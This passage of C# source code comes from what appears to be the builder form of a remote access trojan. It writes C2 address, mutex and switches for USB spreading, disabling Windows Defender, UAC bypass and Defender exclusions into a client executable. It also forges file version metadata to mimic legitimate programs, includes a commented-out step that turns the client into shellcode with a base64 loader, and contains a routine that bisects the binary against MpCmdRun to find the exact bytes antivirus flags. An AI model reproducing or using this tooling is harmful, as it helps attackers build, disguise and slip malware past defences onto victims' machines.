                                        method.Body.Instructions[i].Operand = aes.Encrypt("null");

                                if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
                                    method.Body.Instructions[i].Operand = numDelay.Value.ToString();

                                if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                    method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                if (chkAntiK.Checked)
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Prostaths%")
                                        method.Body.Instructions[i].Operand = "true";
                                if (chkUSB.Checked)
                                    if (method.Body.Instructions[i].Operand.ToString() == "%USB%")
                                        method.Body.Instructions[i].Operand = "true";
                                if (chkKillWD.Checked)
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Aspida%")
                                        method.Body.Instructions[i].Operand = "true";
                                if (chkUac.Checked)
                                    if (method.Body.Instructions[i].Operand.ToString() == "%AlphaOmega%")
                                        method.Body.Instructions[i].Operand = "true";
                                if (chkExclude.Checked)
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Exclude%")
                                        method.Body.Instructions[i].Operand = "true";
                            }
                        }


                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }


        }

        public string getRandomCharacters()
        {
            var sb = new StringBuilder();
            for (var i = 1; i <= new Random().Next(10, 20); i++)
            {
                var randomCharacterPosition = random.Next(0, alphabet.Length);
                sb.Append(alphabet[randomCharacterPosition]);
            }

            return sb.ToString();
        }

        private void BtnClone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtOriginalFilename.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    txtFileVersion.Text =
                        $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txtProductVersion.Text =
                        $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void FormBuilder_FormClosed(object sender, FormClosedEventArgs e)
        {
            var Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
            File.Delete(Billyinstallpath);
        }

        private void btnShelocode_Click(object sender, EventArgs e)
        {
            /*
            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) ||
                    string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
            if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
            guna2Transition1.ShowSync(guna2PictureBox2);
            var Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
            if (File.Exists(Billyinstallpath))
            {
                File.Delete(Billyinstallpath);
                canibuild();
            }
            else
            {
                canibuild();
            }

            ModuleDefMD asmDef = null;
            try
            {
                using (asmDef = ModuleDefMD.Load(Billyinstallpath))
                {
                    var Temppath = Path.Combine(Path.GetTempPath(), "tempClient.exe");
                    if (File.Exists(Temppath)) File.Delete(Temppath);

                    File.Copy(Path.Combine(Billyinstallpath), Temppath);
                    btnShellcode.Enabled = false;
                    btnBuild.Enabled = false;
                    WriteSettings(asmDef, Temppath);
                    asmDef.Write(Temppath);
                    asmDef.Dispose();
                    if (btnAssembly.Checked) WriteAssembly(Temppath);
                    if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                        IconInjector.InjectIcon(Temppath, txtIcon.Text);
                    var savepath = "";
                    using (var saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".bin (*.bin)|*.bin";
                        saveFileDialog1.InitialDirectory = Application.StartupPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK) savepath = saveFileDialog1.FileName;
                    }

                    var Donutpath = Path.Combine(Path.GetTempPath(), "donut.exe");
                    if (!File.Exists(Donutpath)) File.WriteAllBytes(Donutpath, Resources.donut);
                    var Process = new Process();
                    Process.StartInfo.FileName = Donutpath;
                    Process.StartInfo.CreateNoWindow = true;
                    Process.StartInfo.Arguments = "-f " + Temppath + " -o " + savepath;
                    Process.Start();
                    Process.WaitForExit();
                    Process.Close();
                    if (File.Exists(savepath))
                    {
                        File.WriteAllText(savepath + "loader.cs",
                            Resources.ShellcodeLoader.Replace("%PEGASUSshell%",
                                Convert.ToBase64String(File.ReadAllBytes(savepath))));
                        File.WriteAllText(savepath + ".b64", Convert.ToBase64String(File.ReadAllBytes(savepath)));
                    }

                    File.Delete(Temppath);
                    File.Delete(Donutpath);
                    MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    SaveSettings();
                    guna2Transition1.HideSync(guna2PictureBox2);
                    guna2Transition1.ShowSync(guna2PictureBox3);
                    SaveSettings();
                    File.Delete(Billyinstallpath);
                    Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
                btnBuild.Enabled = true;
            }
            */
        }

        private void chVRunPe_CheckedChanged(object sender, EventArgs e)
        {
            if (chVRunPe.Checked)
            {
                btnShellcode.Enabled = false;
                chkObfu.Enabled = false;
                chkObfu.Checked = false;
            }
            else
            {
                btnShellcode.Enabled = true;
                chkObfu.Enabled = true;
                chkObfu.Checked = true;
            }
        }

        private void toolStripMenuItem70_Click(object sender, EventArgs e)
        {
            if (listBoxIP.SelectedItems.Count == 1) listBoxIP.Items.Remove(listBoxIP.SelectedItem);
            if (listBoxPort.SelectedItems.Count == 1) listBoxPort.Items.Remove(listBoxPort.SelectedItem);
        }

        private void btnLocal_Click(object sender, EventArgs e)
        {
            textIP.Text = string.Empty;
            textIP.Text = GetLocalIPAddress();
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    return ip.ToString();
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        private void btnEx_Click(object sender, EventArgs e)
        {
            textIP.Text = string.Empty;
            var utf8 = new UTF8Encoding();
            var webClient = new WebClient();
            var externalIp = utf8.GetString(webClient.DownloadData(
                "https://myexternalip.com/raw"));
            textIP.Text = externalIp;
        }

        private void btnStatic_Click(object sender, EventArgs e)
        {
            string localIP;
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                var endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();

                textIP.Text = string.Empty;
                textIP.Text = localIP;
            }
        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            textPort.Text = "4449";
        }

        private void guna2GradientButton2_Click(object sender, EventArgs e)
        {
            txtMutex.Text = FormatHelper.GenerateMutex();
        }

        private void btnRandom_Click(object sender, EventArgs e)
        {
            var newInfo = randomFileInfo.getRandomFileInfo();
            //txtTitle.Text = newInfo.Title;
            txtDescription.Text = newInfo.Description;
            txtProduct.Text = newInfo.Product;
            txtCompany.Text = newInfo.Company;
            txtCopyright.Text = newInfo.Copyright;
            txtTrademarks.Text = newInfo.Trademark;
            txtFileVersion.Text = newInfo.MajorVersion;
            txtProductVersion.Text = newInfo.MinorVersion;
            //assemblyBuildPart.Text = newInfo.BuildPart;
            //assemblyPrivatePart.Text = newInfo.PrivatePart;
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            SaveSettings();
            MsgBox.Show("IP/PORT saved.");
        }

        private enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        private void guna2GradientButton3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe|All files (*.*)|*.*";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    scan(ofd.FileName);
                }
                //txtBase64.Text = Convert.ToBase64String(File.ReadAllBytes(txtString.Text));

            }
        }
        public void scan(string file)
        {
            Console.SetOut(new ControlWriter(guna2TextBox1));
            //Setup();
            bool debug = false;
            if (file.Length == 2 && file.Contains("debug"))
            {
                debug = true;
            }


            string targetfile = file;
            if (!File.Exists(targetfile))
            {
                Console.WriteLine("[-] Can't access the target file");

                return;
            }

            string originalFileDetectionStatus = Scan(targetfile).ToString();
            if (originalFileDetectionStatus.Equals("NoThreatFound"))
            {
                if (debug) { Console.WriteLine("Scanning the whole file first"); }
                Console.WriteLine("[+] No threat found in submitted file!");
                return;
            }

            if (!Directory.Exists(@"C:\Temp"))
            {
                Console.WriteLine(@"[-] C:\Temp doesn't exist. Creating it...");
                Directory.CreateDirectory(@"C:\Temp");
            }

            string testfilepath = @"C:\Temp\testfile.exe";
            byte[] originalfilecontents = File.ReadAllBytes(targetfile);
            int originalfilesize = originalfilecontents.Length;
            Console.WriteLine("Target file size: {0} bytes ", originalfilecontents.Length);
            Console.WriteLine("Analyzing...\n");

            byte[] splitarray1 = new byte[originalfilesize / 2];
            Buffer.BlockCopy(originalfilecontents, 0, splitarray1, 0, originalfilecontents.Length / 2);
            int lastgood = 0;

            while (true)
            {
                if (debug) { Console.WriteLine("Testing {0} bytes", splitarray1.Length); }
                File.WriteAllBytes(testfilepath, splitarray1);
                string detectionStatus = Scan(testfilepath).ToString();
                if (detectionStatus.Equals("ThreatFound"))
                {
                    if (debug) { Console.WriteLine("Threat found. Halfsplitting again..."); }
                    byte[] temparray = HalfSplitter(splitarray1, lastgood);
                    Array.Resize(ref splitarray1, temparray.Length);
                    Array.Copy(temparray, splitarray1, temparray.Length);
                }
                else if (detectionStatus.Equals("NoThreatFound"))
                {
                    if (debug) { Console.WriteLine("No threat found. Going up 50% of current size."); };
                    lastgood = splitarray1.Length;
                    byte[] temparray = Overshot(originalfilecontents, splitarray1.Length); //Create temp array with 1.5x more bytes
                    Array.Resize(ref splitarray1, temparray.Length);
                    Buffer.BlockCopy(temparray, 0, splitarray1, 0, temparray.Length);
                }
            }
        }

        public void Setup()
        {
            Console.SetOut(new ControlWriter(guna2TextBox1));
            RegistryKey defenderService = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            object defenderServiceValue = defenderService.GetValue("DisableAntiSpyware");
            if (!defenderServiceValue.Equals(0)) //This is the case in situations like Commando
            {
                Console.WriteLine("[-] The defender antispyware service is not enabled, so MpCmdRun will fail. Exiting...");
                Environment.Exit(1);
            }
            defenderService.Close();

            if (!Directory.Exists(@"C:\temp"))
            {
                Console.WriteLine(@"[-] C:\Temp\ doesn't exist. Creating it.");
                Directory.CreateDirectory(@"C:\Temp");
            }

        }
        public class ControlWriter : TextWriter
        {
            private Control guna2TextBox1;
            public ControlWriter(Control textbox)
            {
                this.guna2TextBox1 = textbox;
            }

            public override void Write(char value)
            {
                guna2TextBox1.Text += value;
            }

            public override void Write(string value)
            {
                guna2TextBox1.Text += value;
            }

            public override Encoding Encoding
            {
                get { return Encoding.ASCII; }
            }
        }
        public byte[] HalfSplitter(byte[] originalarray, int lastgood) //Will round down to nearest int
        {
            Console.SetOut(new ControlWriter(guna2TextBox1));
            byte[] splitarray = new byte[(originalarray.Length - lastgood) / 2 + lastgood];
            if (originalarray.Length == splitarray.Length + 1)
            {
                Console.WriteLine("[!] Identified end of bad bytes at offset 0x{0:X} in the original file", originalarray.Length);
                Scan(@"C:\Temp\testfile.exe", true);
                byte[] offendingBytes = new byte[256];

                if (originalarray.Length < 256)
                {
                    Array.Resize(ref offendingBytes, originalarray.Length);
                    Buffer.BlockCopy(originalarray, originalarray.Length, offendingBytes, 0, originalarray.Length);
                }
                else
                {
                    Buffer.BlockCopy(originalarray, originalarray.Length - 256, offendingBytes, 0, 256);
                }
                HexDump(offendingBytes, 16);
                File.Delete(@"C:\Temp\testfile.exe");
                Environment.Exit(0);
            }
            Array.Copy(originalarray, splitarray, splitarray.Length);
            return splitarray;
        }

        public byte[] Overshot(byte[] originalarray, int splitarraysize)
        {
            Console.SetOut(new ControlWriter(guna2TextBox1));
            int newsize = (originalarray.Length - splitarraysize) / 2 + splitarraysize;
            if (newsize.Equals(originalarray.Length - 1))
            {
                Console.WriteLine("Exhausted the search. The binary looks good to go!");
                Environment.Exit(0);
            }
            byte[] newarray = new byte[newsize];
            Buffer.BlockCopy(originalarray, 0, newarray, 0, newarray.Length);
            return newarray;
        }

        //Adapted from https://github.com/yolofy/AvScan/blob/master/src/AvScan.WindowsDefender/WindowsDefenderScanner.cs
        public ScanResult Scan(string file, bool getsig = false)
        {
            Console.SetOut(new ControlWriter(guna2TextBox1));
            if (!File.Exists(file))
            {
                return ScanResult.FileNotFound;
            }

            var process = new Process();
            var mpcmdrun = new ProcessStartInfo(@"C:\Program Files\Windows Defender\MpCmdRun.exe")
            {
                Arguments = $"-Scan -ScanType 3 -File \"{file}\" -DisableRemediation -Trace -Level 0x10",
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            process.StartInfo = mpcmdrun;
            process.Start();
            process.WaitForExit(30000); //Wait 30s

            if (!process.HasExited)
            {
                process.Kill();
                return ScanResult.Timeout;
            }

            if (getsig)
            {
                string stdout;
                string sigName;
                while ((stdout = process.StandardOutput.ReadLine()) != null)
                {
                    if (stdout.Contains("Threat  "))
                    {
                        string[] sig = stdout.Split(' ');
                        sigName = sig[19]; // Lazy way to get the signature name from MpCmdRun
                        Console.WriteLine($"File matched signature: \"{sigName}\"\n");
                        break;
                    }
                }
            }

            switch (process.ExitCode)
            {
                case 0:
                    return ScanResult.NoThreatFound;
                case 2:
                    return ScanResult.ThreatFound;
                default:
                    return ScanResult.Error;
            }

        }

        public enum ScanResult
        {
            [Description("No threat found")]
            NoThreatFound,
            [Description("Threat found")]
            ThreatFound,
            [Description("The file could not be found")]
            FileNotFound,
            [Description("Timeout")]
            Timeout,
            [Description("Error")]
            Error
        }

        //Adapted from https://www.codeproject.com/Articles/36747/Quick-and-Dirty-HexDump-of-a-Byte-Array
        public void HexDump(byte[] bytes, int bytesPerLine = 16)
        {
            Console.SetOut(new ControlWriter(guna2TextBox1));
            if (bytes == null)
            {
                Console.WriteLine("[-] Empty array supplied. Something is wrong...");
            }
            int bytesLength = bytes.Length;

            char[] HexChars = "0123456789ABCDEF".ToCharArray();

            int firstHexColumn =
                  8                   // 8 characters for the address
                + 3;                  // 3 spaces

            int firstCharColumn = firstHexColumn
                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
                + 2;                  // 2 spaces 

            int lineLength = firstCharColumn
                + bytesPerLine           // - characters to show the ascii value
                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

            char[] line = (new String(' ', lineLength - Environment.NewLine.Length) + Environment.NewLine).ToCharArray();
            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
            StringBuilder result = new StringBuilder(expectedLines * lineLength);

            for (int i = 0; i < bytesLength; i += bytesPerLine)
            {
                line[0] = HexChars[(i >> 28) & 0xF];
                line[1] = HexChars[(i >> 24) & 0xF];
                line[2] = HexChars[(i >> 20) & 0xF];
                line[3] = HexChars[(i >> 16) & 0xF];
                line[4] = HexChars[(i >> 12) & 0xF];
                line[5] = HexChars[(i >> 8) & 0xF];
                line[6] = HexChars[(i >> 4) & 0xF];
                line[7] = HexChars[(i >> 0) & 0xF];

                int hexColumn = firstHexColumn;
                int charColumn = firstCharColumn;

                for (int j = 0; j < bytesPerLine; j++)
                {
                    if (j > 0 && (j & 7) == 0) hexColumn++;
                    if (i + j >= bytesLength)
                    {
                        line[hexColumn] = ' ';
                        line[hexColumn + 1] = ' ';
                        line[charColumn] = ' ';
                    }
                    else
                    {
                        byte b = bytes[i + j];
                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
                        line[hexColumn + 1] = HexChars[b & 0xF];
                        line[charColumn] = (b < 32 ? '·' : (char)b);
                    }
                    hexColumn += 3;
                    charColumn++;
                }
                result.Append(line);
            }
            Console.WriteLine(result.ToString());
        }
    }

}